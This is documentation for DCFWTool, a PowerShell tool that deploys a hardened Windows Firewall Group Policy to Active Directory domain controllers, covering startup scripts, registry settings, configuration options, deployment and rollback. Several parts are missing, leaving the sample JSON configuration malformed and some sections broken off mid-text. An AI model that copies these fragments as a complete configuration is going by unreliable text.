This setting is catalogued in the [Windows security baseline](https://learn.microsoft.com/en-us/azure/governance/policy/samples/guest-configuration-baseline-windows)
under ID *AZ-WIN-00145*. Contrary to its name, this setting has no effect on the mDNS protocol.

If the mDNS protocol is to be disabled as well, this [undocumented registry setting](https://techcommunity.microsoft.com/t5/networking-blog/mdns-in-the-enterprise/ba-p/3275777)
must be used:

> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNSCache\\Parameters  
> Registry value: EnableMDNS  
> Value type: REG_DWORD  
> Value data: 0

To simplify the deployment of this setting,
it has been added to the [DomainControllerFirewall.admx](#domaincontrollerfirewalladmx) custom template.

The NBNS protocol is more complicated to deal with.
Historically, it could only be disabled on a per-adapter basis.
Startup scripts performing WMI calls are therefore often used by enterprises.
Below is an example of such a script:

```powershell
Get-WmiObject -Class Win32_NetworkAdapterConfiguration `
              -Filter 'TcpipNetbiosOptions IS NOT NULL' |
    Invoke-WmiMethod -Name SetTcpipNetbios -ArgumentList 2
```

The [SecGuide.admx](#secguideadmx) template,
which is part of the [Security Compliance Toolkit (SCT)](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10),
contains a similar setting called [NetBT NodeType configuration](https://www.betaarchive.com/wiki/index.php/Microsoft_KB_Archive/160177)
and its recommended value is **P-Node**. Below is the corresponding registry setting:

> HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Netbt\\Parameters
> Registry value: NodeType  
> Value type: REG_DWORD  
> Value data: 2

Since Windows 11, there is yet another NBNS-related Group Policy setting available,
but it does not seem to actually work.
It is located under Computer Configuration → Policies → Administrative Templates
→ Network → DNS Client → **Configure NetBIOS settings**. This is the corresponding registry setting:

> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient
> Registry value: EnableNetbios  
> Value type: REG_DWORD  
> Value data: 0

## Group Policy Object Contents

The Group Policy Object created and managed by the `DCFWTool` contains a lot of settings,
including firewall rules, registry values, and a startup script.
This chapter contains a detailed description of these configuration items.

![Managed GPO contents](../Images/Screenshots/gpo-contents.png)

### Windows Firewall Configuration

Based on the configured options in the [Set-ADDSFirewallPolicy.json configuration file](#configuration-file),
the resulting GPO will contain the following Windows Firewall settings applied to all profiles:

- Turn on the Windows Firewall
- Block inbound connections by default
- Disable local firewall rules
- [Log dropped packets](#logdroppedpackets)
- [Log allowed packets](#logallowedpackets)
- [Log file location](#logfilepath)
- [Maximum log file size](#logmaxsizekilobytes)
- [Enable local IPSec rule merge](#enablelocalipsecrules)

![GPO firewall configuration](../Images/Screenshots/gpo-firewall-config.png)

A complete list of inbound firewall rules created by the tool is available in [the last chapter](#inbound-firewall-rules-reference).

![GPO inbound firewall rules](../Images/Screenshots/gpo-firewall-inbound-rules.png)

### Registry Settings

Based on the configured options in the [Set-ADDSFirewallPolicy.json configuration file](#configuration-file),
the GPO will contain a number of registry settings.
Most of them are managed, which means that once the GPO is not linked to the target,
the settings revert back to the default state.
Some of them are [unmanaged](#dealing-with-gpo-tattooing) though
and require attention when being reverted back to system defaults.

![GPO registry settings](../Images/Screenshots/gpo-registry.png)

The following registry-based network settings recommended by Microsoft are always configured:

| Setting                                                                                                          | State    |
|------------------------------------------------------------------------------------------------------------------|----------|
| MSS: (EnableICMPRedirect) Allow ICMP redirects to override OSPF generated routes                                 | Disabled |
| MSS: (DisableIPSourceRouting) IP source routing protection level (protects against packet spoofing)              | Enabled  |
| MSS: (DisableIPSourceRouting IPv6) IP source routing protection level (protects against packet spoofing)         | Enabled  |
| MSS: (PerformRouterDiscovery) Allow IRDP to detect and configure Default Gateway addresses (could lead to DoS)   | Disabled |
| MSS: (NoNameReleaseOnDemand) Allow the computer to ignore NetBIOS name release requests except from WINS servers | Enabled  |

Note that support for these settings is added by the [MSS Legacy](#mss-legacy-admx) administrative template.

### Administrative Templates

The following ADMX files and their respective English ADML files are copied
to the [Central ADMX Store](https://learn.microsoft.com/en-us/troubleshoot/windows-client/group-policy/create-and-manage-central-store)
if it exists:

#### DomainControllerFirewall.admx

This custom ADMX template enables configuration of the following settings:

[NTDS Static Port](#ntdsstaticport)

:   Computer Configuration → Administrative Templates → RPC Static Ports →
    Domain Controller: Active Directory RPC static port

[Netlogon Static Port](#netlogonstaticport)  

:   Computer Configuration → Administrative Templates → RPC Static Ports →
    Domain Controller: Netlogon static port

[FRS Static Port](#frsstaticport)  

:   Computer Configuration → Administrative Templates → RPC Static Ports →
    Domain Controller: File Replication Service (FRS) static port

[mDNS Configuration](#disablemdns)  

:   Computer Configuration → Administrative Templates → Network → DNS Client →
    Turn off Multicast DNS (mDNS) client

#### SecGuide.admx

This template is provided by Microsoft as part of the [Security Compliance Toolkit](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10).

The corresponding settings can be found under Computer Configuration → Administrative Templates → MS Security Guide.

#### MSS-legacy.admx {#mss-legacy-admx}

The [MSS (Legacy) template](https://techcommunity.microsoft.com/blog/microsoft-security-baselines/the-mss-settings/701055)
is provided by Microsoft as part of the [Security Compliance Toolkit](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10).

The corresponding settings can be found under Computer Configuration → Administrative Templates → MSS (Legacy).

### Startup Script

The managed GPO also contains a startup script called `FirewallConfiguration.bat`,
which is used to configure some firewall-related settings
that cannot be deployed through declarative Group Policy extensions.
The script is automatically generated based on the configuration defined
in the [Set-ADDSFirewallPolicy.json](#configuration-file)
and it may execute the following actions:

- Configure a fixed port for Windows Management Instrumentation (WMI).
- Install DFS Management tools, if not already present on the machine.
- Set up a static port for the Distributed File System Replication (DFSR).
- Create a firewall log file and set appropriate permissions on it.
- Register remote procedure call (RPC) filters.

The batch file format is intentionally used instead of a Powershell script to avoid potential issues with the execution policy.

![Autogenerated Group Policy startup script](../Images/Screenshots/deploy-gpo-startup-script.png)

> [!WARNING]
> As startup scripts depend on [foreground GPO processing](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj573586(v=ws.11)),
> target servers need to be restarted at least once for these settings to be applied.
> Some workarounds are discussed in the chapter on [System Reboots](#system-reboots).

#### WMI Static Port

Depending on the [WmiStaticPort](#wmistaticport) setting, the startup script will reconfigure
the WMI service to run in a standalone process listening on TCP port 24158
with the authentication level set to `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`.
This is achieved by executing the following command:

```bat
winmgmt.exe /standalonehost 6
```

#### DFSR Static Port

Depending on the [DfsrStaticPort](#dfsrstaticport) setting,
the startup script will ensure that the optional DFS Management tools are installed:

```bat
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
  dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)
```

Next, it will configure the DFSR to use a static port:

```bat
dfsrdiag.exe StaticRPC /Port:5722
```

#### Firewall Log File

Due to a known bug in Windows, it is not enough to enable dropped packet logging
through the Windows Firewall settings dialog window.

![Firewall log file configuration](../Images/Screenshots/firewall-log-config.png){ width=400px }

The log file needs to be created manually
and write permissions must be granted to the firewall service.
The startup script takes care of this additional step by executing the command line below:

```bat
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
```

The optional [LogFilePath](#logfilepath) setting can be used if the default log path is undesirable.

#### RPC Filters Script

If the [EnableRpcFilters](#enablerpcfilters) setting is configured,
the startup script will register all RPC filters defined in the `RpcNamedPipesFilters.txt` file
by running the following command:

```bat
netsh.exe -f "%~dp0RpcNamedPipesFilters.txt"
```

The `RpcNamedPipesFilters.txt` file will be located in the `Startup` directory of the GPO:

![RPC Filters configuration file](../Images/Screenshots/deploy-rpcnamedpipesfilter.png)

### NPS Fix for Downlevel Windows Servers

Due to a known bug in downlevel Windows versions,
Windows Server 2022 firewall rules related to the Network Policy Server (NPS)
do not work in Windows Server 2019 and 2016.

If the presence of Network Policy Server is indicated using the [EnableNPS](#enablenps) setting,
the startup script will contain
a [simple fix](https://learn.microsoft.com/en-us/answers/questions/97643/windows-server-2019-nps-(network-policy-server)-so)
for this issue:

```bat
sc.exe sidtype IAS unrestricted
```

The command enables the NPS service to be targeted by firewall rules.

#### Sample Startup Scripts

Here is an example of a full startup script generated by the `DCFWTool`:

```shell
@ECHO OFF
REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.

echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
winmgmt.exe /standalonehost 6

echo Install the dfsrdiag.exe tool if absent.
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)

echo Set static RPC port for DFS Replication.
dfsrdiag.exe StaticRPC /Port:5722

echo Create the firewall log file and configure its DACL.
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"

echo Register the RPC filters.
netsh.exe -f "%~dp0RpcNamedPipesFilters.txt"

echo Fix the NPS service to work with Windows Firewall on downlevel Windows Server versions.
sc.exe sidtype IAS unrestricted
```

And here is a script applying inverted settings:

```shell
@ECHO OFF
REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.

echo Move the WMI service into the shared Svchost process.
winmgmt.exe /sharedhost

echo Install the dfsrdiag.exe tool if absent.
if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
)

echo Set dynamic RPC port for DFS Replication.
dfsrdiag.exe StaticRPC /Port:0

echo Create the firewall log file and configure its DACL.
netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"

echo Remove all RPC filters.
netsh.exe rpc filter delete filter filterkey=all
```

## Configuration

### Configuration File

The `Set-ADDSFirewallPolicy.ps1` script expects a configuration file
called `Set-ADDSFirewallPolicy.json` to be present in the same directory.
To prevent accidental execution of the script with default settings,
the configuration file does not exist by default and needs to be created manually before deployment.

To simplify the task of creation of a custom configuration file, the `DCFWTool` comes with 2 sample files:

- `Set-ADDSFirewallPolicy.Starter.json`

   Contains only the minimum settings required for firewall policy deployment.
   It is recommended to rename the file to `Set-ADDSFirewallPolicy.json` and to add any additional customizations
   of the policy object to be deployed.

- `Set-ADDSFirewallPolicy.Sample.json`

    Contains all the possible configuration items with sample values.
    It is essential to thoroughly review and adjust all the settings. This sample file should never be used "AS IS".

> [!CAUTION]
> Improper configuration can cause network outages in your environment!

Here is a sample configuration file containing all the possible settings:

```json
{
  "$schema": "Set-ADDSFirewallPolicy.schema.json",
  "GroupPolicyObjectName": "Domain Controller Firewall",
  "TargetDomain": "contoso.com",
  "GroupPolicyObjectComment": "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.",

   ]
}
```

To further simplify the modification of configuration files,
the solution contains a JSON schema file called `Set-ADDSFirewallPolicy.schema.json`,
which provides code completion support to modern IDEs like [VS Code](https://code.visualstudio.com/):

### Dealing with GPO Tattooing

Some firewall-related settings are not removed from the domain controllers after they fall out of the scope of the GPO.
These changes are thus permanent and require manual removal.
Such settings are called **unmanaged** and the resulting behavior is known as GPO tattooing.
To address this issue, the `DCFWTool` configuration files use ternary logic:

- `true` ⇒ The setting is enabled by the GPO.
- `false` ⇒ The setting is disabled by the GPO.
- `null` ⇒ The local setting is not changed by the GPO.

As a consequence, before the value of an unmanaged setting can be changed from `true` to `null`,
it must temporarily be set to `false`.
Keep in mind that it may take time for the new settings to propagate to all domain controllers due to replication latency.
Additionally, some settings [may require a reboot](#system-reboots).

The following settings in this project are known to cause tattooing:

- [NtdsStaticPort](#ntdsstaticport)
- [NetlogonStaticPort](#netlogonstaticport)
- [FrsStaticPort](#frsstaticport)
- [DfsrStaticPort](#dfsrstaticport)
- [WmiStaticPort](#wmistaticport)
- [DisableNetbiosBroadcasts](#disablenetbiosbroadcasts)
- [DisableMDNS](#disablemdns)
- [EnableRpcFilters](#enablerpcfilters)

All settings in the [MSS Legacy](#registry-settings) administrative template are unmanaged as well.

The remainder of this chapter contains documentation to all the settings supported by the `DCFWTool`.

### GroupPolicyObjectName

The name of the Group Policy Object (GPO) that will be created or updated.

```yaml
Type: String
Required: true
Default value: "Domain Controller Firewall"
```

Feel free to change it so that it complies with your naming convention.

### GroupPolicyObjectComment

The comment text that will be visible on the GPO object.

```yaml
Type: String
Required: false
Default value: "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script."
```

### TargetDomain

FQDN of the domain in which the Group Policy Object (GPO) will be created or updated.

```yaml
Type: String
Required: false
Default value: null
```

This setting is only useful in multi-domain forests.
If not specified, the script will attempt to determine the domain of the local computer.

### LogDroppedPackets

Indicates whether the packets dropped by the firewall should be logged.

```yaml
Type: Boolean
Required: false
Default value: false
Recommended value: true
Possible values: true / false
```

If `true`, all dropped packets will be logged into the [firewall text log](#logfilepath).

If `false`, dropped packets will not be logged.

### LogAllowedPackets

Indicates whether the packets allowed by the firewall should be logged.

```yaml
Type: Boolean
Required: false
Default value: false
Recommended value: false
Possible values: true / false
```

If `true`, all allowed packets will be logged into the [firewall text log](#logfilepath).

If `false`, allowed packets will not be logged.

### LogFilePath

Specifies the path to the log file that will be used to store information about
the allowed and/or dropped packets if [logging is enabled](#logdroppedpackets).

```yaml
Type: String
Required: false
Default value: %systemroot%\\system32\\logfiles\\firewall\\pfirewall.log
```

The provided value will be used by the [startup script](#firewall-log-file) to configure the log.

As all 3 profiles (Domain/Private/Public) are configured identically,
a shared log file is created for all of them.
This is to allow easier search, troubleshooting, and ingestion by log collectors.

### LogMaxSizeKilobytes

Sets the maximum size of the [firewall log](#logfilepath) in kilobytes (KB).

```yaml
Type: Integer
Required: false
Default value: 128
Recommended value: 16384
Possible values: 1 - 32767
```

The file won't grow beyond this size; when the limit is reached,
old log entries are deleted to make room for the newly created ones.

To be compliant with security standards like STIG or CIS, set this value to **at least 16384**.

### ClientAddresses

List of client IP addresses from which inbound traffic should be allowed.

```yaml
Type: String[]
Required: false
Default value: [ "Any" ]
```

Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma,

Supports also "Any" as an input.

Specify IPv4 address, IPv4 subnet or address range of all your clients.
Anything that acts as a client from a DC perspective is considered a client here,
so you should specify all your server and user/client subnets.
Everything that needs to interact with your DCs should be included here,
except for other DCs and secure endpoints (PAWs) used to manage Domain Controllers or Tier 0 in general.

> [!WARNING]
> This is a critical configuration setting! With improper configuration,
> this could cause network outages for your clients.

### ManagementAddresses

firewall rule will be enabled in the target GPO.

If `false`, this rule will be disabled.

> [!WARNING]
> It is highly recommended to DISABLE the Printer Spooler service on domain controllers
> to decrease the attack surface.

### EnableNetworkProtection

Indicates whether the [Network protection](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/network-protection?view=o365-worldwide#overview-of-network-protection)
feature of Microsoft Defender Antivirus should be enabled.

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

If `true`, MDA Network Protection will be configured in **block mode**.

If `false`, MDA Network Protection will be configured in **audit mode** only.

If `null`, MDA Network Protection will not be managed by the GPO.

### BlockWmiCommandExecution

Indicates whether to block [process creations originating from PSExec and WMI commands](#ms-wmi-windows-management-instrumentation-remote-protocol)
using Defender ASR.

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

This is achieved by enforcing the following Microsoft Defender Antivirus Attack Surface Reduction (ASR) rules:

- [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands)
- [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-persistence-through-wmi-event-subscription)

If `true`, MDA Attack Surface Reduction rules (mentioned above) will be configured in **block mode**.

If `false`, MDA Attack Surface Reduction rules (mentioned above) will be configured in **audit mode** only,
allowing you to evaluate the possible impact if the rules were enabled in block mode.

If `null`, MDA Attack Surface Reduction rules will not managed by the GPO, effectively disabling the rules.

> [!IMPORTANT]
> System Center Configuration Manager (SCCM) client and Distribution Point (DP)
> will not work properly on domain controllers if this setting is enabled.

### EnableRpcFilters

Indicates whether additional [filtering of RPC over Named Pipes](#rpc-filters) should be applied.

```yaml
Type: Boolean
Required: false
Default value: null
Recommended value: true
Possible values: true / false / null
```

If `true`, RPC filters defined in the `RpcNamedPipesFilters.txt` file will be enabled using a startup script.

If `false`, any pre-existing RPC filters will be deleted using a startup script.

If `null`, RPC filters will not be changed by the GPO.

### EnableLocalIPsecRules

Indicates whether local IPSec rules should be enabled.

```yaml
Type: Boolean
Required: false
Default value: true
Recommended value: false
Possible values: true / false
```

If `true`, local IPSec rules will be applied.

If `false`, only IPSec rules distributed through GPOs will be applied.

> [!NOTE]
> Although no IPSec rules are deployed by this solution,
> most [security baselines](#security-standards-compliance) require local IPSec rules to be disabled.

### CustomRuleFileNames

Specifies the name(s) of additional script file(s) containing firewall rules
that will be imported into the Group Policy Object (GPO).

```yaml
Type: String[]
Required: false
Default value: null
```

There are several practical advantages to keeping customer-specific firewall rules in separate files:

- The main script file can easily be updated without the need to re-apply customer modifications.
- Custom rule scripts can be shared among multiple server roles.
  As an example, rules enabling communication with a backup agent will probably be the same
  for a domain controller (DC) and certification authority (CA).

Below is an excerpt from a custom rule script file that enables communication with Zabbix monitoring agents:

```powershell
New-NetFirewallRule -GPOSession $GPOSession `
                    -Name 'Zabbix-In-TCP' `
                    -DisplayName 'Zabbix Agent (TCP-In)' `
                    -Group 'Zabbix Agent' `
                    -Enabled True `
                    -Profile Any `
                    -Direction Inbound `
                    -Action Allow `
                    -Protocol TCP `
                    -LocalPort 10050 `
                    -RemoteAddress $RemoteManagementAddresses `
                    -Program '%ProgramFiles%\Zabbix\zabbix_agentd.exe' `
                    -Verbose:$isVerbose > $null
```

See the `CustomRules.Sample.ps1` sample file, which contains some additional boilerplate code
and can be used as a template.

## Deployment

### Prerequisites

- The tool has been tested on Windows Server 2022, Windows Server 2019, and Windows 11,
  but it should work on all Windows versions currently supported by Microsoft.

    ![](../Images/Badges/windows-server.png "Windows Server") ![](../Images/Badges/windows-client.png "Windows Client")

- Although the script might work in PowerShell Core, it has only been tested in PowerShell Desktop.

    ![](../Images/Badges/powershell5.png "PowerShell 5")

- Domain Admins group membership or equivalent privileges, enabling the creation of a Group Policy Object (GPO),
  creation of folders and files in `SYSVOL`, and linking the GPO to the Domain Controllers OU.
- PowerShell modules that must be installed as part of RSAT:
    - [GroupPolicy](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/?view=windowsserver2022-ps)
    - [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps)
- In environments with Microsoft Advanced Group Policy Management (AGPM), all GPO changes happen outside of AGPM.

### Installation

1. [Download](https://github.com/MichaelGrafnetter/active-directory-firewall/releases) the current version of the `DCFWTool`
   to an administrative Windows computer.
2. Rename the `Set-ADDSFirewallPolicy.Starter.json` configuration file to `Set-ADDSFirewallPolicy.json`.
3. Review the [available configuration options](#configuration) and adjust the JSON file to fit your environment.
4. In some organizations, additional firewall rules might need to be added
   through the [CustomRuleFileNames](#customrulefilenames) option. Always perform a review
   of the [default set of rules](#inbound-firewall-rules-reference) that will be deployed by the GPO and check if it is sufficient.
5. Open a Powershell terminal and run the `Set-ADDSFirewallPolicy.ps1` script.

    ![Executing the PowerShell script](../Images/Screenshots/deploy-install-script.png)

    The script should create a new Group Policy Object (GPO) called *Domain Controller Firewall*.
    This default name [can be changed](#grouppolicyobjectname) in the JSON configuration file.

    > [!NOTE]
    > The GPO is intentionally **not linked** to any organizational unit (OU) by default.

6. Open the Group Policy Management Console (`gpmc.msc`) and **review the freshly created GPO thoroughly**.
   You might need to return to step 3 if anything does not check out.
7. Link the newly created GPO to the Domain Controllers OU.

    ![Group Policy link](../Images/Screenshots/deploy-gpo-link.png)

8. Wait until the GPO gets replicated from the PDC Emulator to the remaining domain controllers.
   The DCs should then apply the new firewall configuration within 5 minutes.
9. Some settings require additional manual actions to be performed on all DCs to apply.
   Please refer to the [System Reboots](#system-reboots).

### System Reboots

Changes to some settings require a reboot of the target domain controller to be applied.
This is the with static port number configurations and settings that are modified through the startup script:

- [NtdsStaticPort](#ntdsstaticport)
- [NetlogonStaticPort](#netlogonstaticport)
- [FrsStaticPort](#frsstaticport)
- [DfsrStaticPort](#dfsrstaticport)
- [WmiStaticPort](#wmistaticport)
- [EnableRpcFilters](#enablerpcfilters)
- [LogFilePath](#logfilepath)
- [EnableNPS](#enablenps)

If a full system reboot of all domain controllers is undesirable, the following steps can be performed instead:

1. Make sure that the Group Policy changes are replicated to all domain controllers.
2. Invoke the `gpupdate.exe /Target:Computer` command for the changed policies to be applied immediately.
3. Run the `gpscript.exe /startup` command for Group Policy startup scripts to be executed immediately.
4. Execute the `net.exe stop NTDS && net.exe start NTDS` command to restart the AD DS Domain Controller service.
5. Execute the `net.exe stop IAS && net.exe start IAS` command to restart the Network Policy Server service, if present.
6. Execute the `net.exe stop NtFrs && net.exe start NtFrs` command to restart the File Replication service
   if migration to DFS-R has not been performed yet.
7. Repeat steps 2 to 6 on all domain controllers.

### Multi-Domain Forests

The firewall policy can be deployed to multiple AD domains at once.
The recommended approach for multi-domain forests is to have multiple domain-specific JSON configuration files.
Each configuration file must contain the [TargetDomain](#targetdomain) setting.
The optional `-ConfigurationFileName` script parameter can then be used to specify the JSON file to be applied:

```powershell
.\Set-ADDSFirewallPolicy.ps1 -ConfigurationFileName 'DCFW.CONTOSO.json'
.\Set-ADDSFirewallPolicy.ps1 -ConfigurationFileName 'DCFW.CORP.json'
```

### Configuration Updates

The `Set-ADDSFirewallPolicy.ps1` script can be executed repeatedly. If the target GPO already exists,
the script will modify it to match the configuration file instead of creating a new GPO.
This behavior is especially useful if any IP addresses in the firewall rules need to be changed.
Instead of modifying the firewall rules one by one, it is enough to change the corresponding JSON configuration file
and execute the PowerShell script again.

The script always deletes all firewall rules in the target GPO and recreates them from scratch.
This is performed as an atomic operation (transaction) to prevent the firewall policy
from being in an incomplete state that could potentially result in a DoS.

### Troubleshooting

#### Script Execution Policy

You might need to adjust your Powershell execution policy to allow execution of `Set-ADDSFirewallPolicy.ps1` script:

![Changing the Script Execution Policy](../Images/Screenshots/deploy-ps-exec-policy.png)

> [!NOTE]
> If you are using AppLocker, Device Guard, or Constrained Language Mode,
> you might need adjust the configured restrictions in order to run the script.

#### Dropped Packets

The following PowerShell script can be used to display the Windows Firewall log file in a human-readable way:

```powershell
[string] $logFilePath = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"

[string[]] $columnsToShow = @('date','time','path','action','pid',
    'src-ip','src-port','dst-ip','dst-port','icmptype','icmpcode')

Get-Content -Path $LogFilePath |
    Select-Object -Skip 3 |
    ForEach-Object { $PSItem -replace '^#Fields: ' } |
    ConvertFrom-Csv -Delimiter ' ' |
    Select-Object -Property $columnsToShow |
    Out-GridView -Title 'Windows Firewall Log' -Wait
```

![Parsing firewall log files](../Images/Screenshots/firewall-log-parser.png){ width=400px }

An improved version of this script is available in the `Show-WindowsFirewallLog.ps1` file, which is part of the `DCFWTool`.

### Rollback

As some of the settings are propagated through a startup script and some, even though propagated through GPO,
[cause tattooing](#dealing-with-gpo-tattooing), resetting the DC configuration
is not as straightforward as unlinking the firewall policy GPO.

To perform an emergency rollback procedure, follow these steps:

1. Unlink the Domain Controller Firewall GPO

    Delete or unlink the firewall GPO from the Domain Controllers OU in the Group Policy Management console.

2. Wait for AD replication

    Enforce replication or wait until the AD and SYSVOL replication convergence is achieved
    and all DCs in the domain have received the new GPO settings.

3. Execute the rollback script

    Run the `Undo-ADDSFirewallPolicy.bat` in an elevated command prompt on all domain controllers in the domain.

4. Restart the DCs

    Although the script from the previous step restarts the affected services,
    a reboot of all domain controllers might be required
    for the new default settings to be applied.

## Security Standards Compliance

The [Security Compliance Toolkit (SCT)](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10)
is a set of tools that allows enterprise security administrators to download, analyze, test, edit,
and store Microsoft-recommended security configuration baselines for Windows and other Microsoft products.

Our firewall configuration is compliant with the majority
of the [SCT Windows Server 2022 Security Baseline](https://www.microsoft.com/en-us/download/details.aspx?id=55319)
requirements out-of-the-box and the configuration file can easily be modified to achieve full compliance.

## Inbound Firewall Rules Reference

### Microsoft's Guidelines

There are multiple official documents available that list the ports used by Windows Server and specifically Active Directory:

- [How to configure a firewall for Active Directory domains and trusts](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/config-firewall-for-ad-domains-and-trusts)
- [Service overview and network port requirements for Windows](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/service-overview-and-network-port-requirements)

The following table maps all the ports used by domain controllers to the corresponding Windows Firewall rules:

A handful of services that use dynamic RPC ports by default (see the table above)
can be configured to use static ones through the [Configuration File](#configuration-file):

- [NTDS](#ntdsstaticport)
- [Netlogon](#netlogonstaticport)
- [FRS](#frsstaticport)
- [DFSR](#dfsr-static-port)

Additional firewall rules that are not DC-specific might be required to enable core networking functionality
and server remote management:

### Additional Server Roles and Features

#### Server Role Co-Location

As a security best-practice, it is recommended not to deploy additional server roles on domain controller servers.
Unfortunately, real-world environments do not always follow this recommendation and domain controllers
often serve as branch office DHCP and RADIUS servers as well. This chapter therefore contains a list of optional
firewall rules that can be enabled to support such scenarios.

For now, the following Windows Server roles and features are covered:

- [Windows Internet Naming Service (WINS)](#windows-internet-naming-service-wins-tcp-in)
- [Dynamic Host Configuration Protocol (DHCP) Server](#dhcp-server-v4-udp-in)
- [Network Policy Server (NPS)](#network-policy-server-legacy-radius-authentication---udp-in)
- [Web Server (IIS)](#world-wide-web-services-http-traffic-in) (highly discouraged)
- [Windows Deployment Services (WDS)](#windows-deployment-services-udp-in)
- [Key Management Service (KMS)](#key-management-service-tcp-in)
- [File Server Resource Manager (FSRM)](#remote-file-server-resource-manager-management---fsrm-service-rpc-in)
- [Print Spooler](#file-and-printer-sharing-spooler-service---rpc) (highly discouraged)
- [Windows Server Update Services (WSUS)](#windows-server-update-services-http-in)
- [OpenSSH SSH Server](#openssh-ssh-server-sshd)

| Remote Addresses | [Domain Controllers](#domaincontrolleraddresses) |

This rule is governed by the [EnableDhcpServer](#enabledhcpserver) setting.

If the DHCP server role is co-located with the domain controller role, it is highly probable that other DCs
are configured in the same way. It would therefore make sense to allow DHCP failover betweeen DCs.
